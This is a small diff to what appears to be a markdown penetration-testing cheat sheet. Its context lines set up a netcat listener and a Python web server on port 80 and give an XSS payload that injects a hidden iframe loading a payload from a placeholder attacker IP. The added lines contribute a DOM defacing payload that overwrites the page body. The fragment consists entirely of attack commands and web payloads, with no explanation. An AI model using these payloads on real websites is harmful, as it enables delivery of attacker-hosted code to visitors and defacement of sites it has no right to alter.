@@ -6047,6 +6047,9 @@ sudo nc -lnvp 80
 sudo python -m SimpleHTTPServer 80
 ### place redirect in XSS on vulnerable page
 <iframe src=http://attacker_IP_here/path/to/payload height=”0” width=”0”></iframe>
+
+# DOM manipulation / defacing payload
+document.body.innerHTML="some_defacing_here";
 ```
 
 
